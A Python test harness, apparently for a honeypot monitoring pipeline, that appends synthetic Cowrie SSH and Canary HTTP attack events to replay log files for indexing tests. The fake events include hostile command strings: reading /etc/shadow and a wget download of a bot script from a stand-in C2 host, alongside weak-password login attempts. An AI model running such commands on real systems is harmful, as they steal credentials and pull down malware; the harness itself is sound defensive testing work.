#!/usr/bin/env python3
"""
replay-harness.py - Synthetic attack replay for pipeline testing.

Appends a multi-stage Cowrie session and Canary HTTP probes to replay/*.json on the
core. Vector indexes them into chronos-replay-* (never chronos-logs-*), so synthetic
data cannot pollute live findings. Each run uses a fresh Cowrie session id.
"""
import argparse
import json
import time
import uuid
from pathlib import Path

DEFAULT_COWRIE_LOG = "replay/cowrie.json"
DEFAULT_CANARY_LOG = "replay/canary.json"

COWRIE_ATTACK_SCENARIOS = [
    {"eventid": "cowrie.session.connect", "src_ip": "198.51.100.55", "protocol": "ssh"},
    {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.55", "username": "root", "password": "admin123"},
    {"eventid": "cowrie.login.failed", "src_ip": "198.51.100.55", "username": "root", "password": "password"},
    {"eventid": "cowrie.login.success", "src_ip": "198.51.100.55", "username": "admin"},
    {"eventid": "cowrie.command.input", "src_ip": "198.51.100.55", "input": "uname -a"},
    {"eventid": "cowrie.command.input", "src_ip": "198.51.100.55", "input": "cat /etc/shadow"},
    {"eventid": "cowrie.command.input", "src_ip": "198.51.100.55", "input": "wget http://c2.evil.example/bot.sh"},
    {"eventid": "cowrie.session.file_download", "src_ip": "198.51.100.55", "url": "http://c2.evil.example/bot.sh"},
    {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.55", "duration": 4.2},
]

CANARY_ATTACK_SCENARIOS = [
    {"event_type": "canary_http_hit", "src_ip": "203.0.113.88", "path": "/", "method": "GET", "user_agent": "Mozilla/5.0"},
    {"event_type": "canary_http_hit", "src_ip": "203.0.113.88", "path": "/admin", "method": "GET", "user_agent": "Nikto/2.1.6"},
    {"event_type": "canary_http_hit", "src_ip": "203.0.113.88", "path": "/config.json", "method": "GET", "user_agent": "sqlmap/1.7"},
]


def run_cowrie_replay(log_path: str, speed: float = 1.0):
    path = Path(log_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    print(f"[*] Starting Cowrie Attack Simulation Replay -> {log_path} (speed={speed}x)...")
    start = time.time()
    session = uuid.uuid4().hex[:12]
    with open(path, "a") as f:
        for event in COWRIE_ATTACK_SCENARIOS:
            event_copy = dict(event, session=session)
            event_copy["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            f.write(json.dumps(event_copy) + "\n")
            f.flush()
            print(f"  [+] Injected Cowrie event: {event_copy['eventid']} (src: {event_copy['src_ip']})")
            if speed > 0:
                time.sleep(0.4 / speed)
    elapsed = round(time.time() - start, 2)
    print(f"[+] Cowrie replay complete in {elapsed} s ({len(COWRIE_ATTACK_SCENARIOS)} events, session {session}).")


def run_canary_replay(log_path: str, speed: float = 1.0):
    path = Path(log_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    print(f"[*] Starting Canary HTTP Attack Simulation Replay -> {log_path} (speed={speed}x)...")
    start = time.time()
    with open(path, "a") as f:
        for event in CANARY_ATTACK_SCENARIOS:
            event_copy = dict(event)
            event_copy["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            f.write(json.dumps(event_copy) + "\n")
            f.flush()
            print(f"  [+] Injected Canary event: {event_copy['path']} (src: {event_copy['src_ip']})")
            if speed > 0:
                time.sleep(0.4 / speed)
    elapsed = round(time.time() - start, 2)
    print(f"[+] Canary replay complete in {elapsed} s ({len(CANARY_ATTACK_SCENARIOS)} events written).")


def main():
    parser = argparse.ArgumentParser(description="Chronos Attack Simulation & Replay Harness")
    parser.add_argument("--cowrie-log", default=DEFAULT_COWRIE_LOG, help=f"Path to Cowrie log file (default: {DEFAULT_COWRIE_LOG})")
    parser.add_argument("--canary-log", default=DEFAULT_CANARY_LOG, help=f"Path to Canary log file (default: {DEFAULT_CANARY_LOG})")
    parser.add_argument("--speed", type=float, default=2.0, help="Replay speed multiplier (default: 2.0)")
    parser.add_argument("--canary-only", action="store_true", help="Replay only Canary HTTP events")
    parser.add_argument("--cowrie-only", action="store_true", help="Replay only Cowrie SSH events")

    args = parser.parse_args()

    if not args.canary_only:
        run_cowrie_replay(args.cowrie_log, args.speed)
    if not args.cowrie_only:
        run_canary_replay(args.canary_log, args.speed)

    print("[*] Replay harness finished. Vector should ingest events into OpenSearch.")


if __name__ == "__main__":
    main()
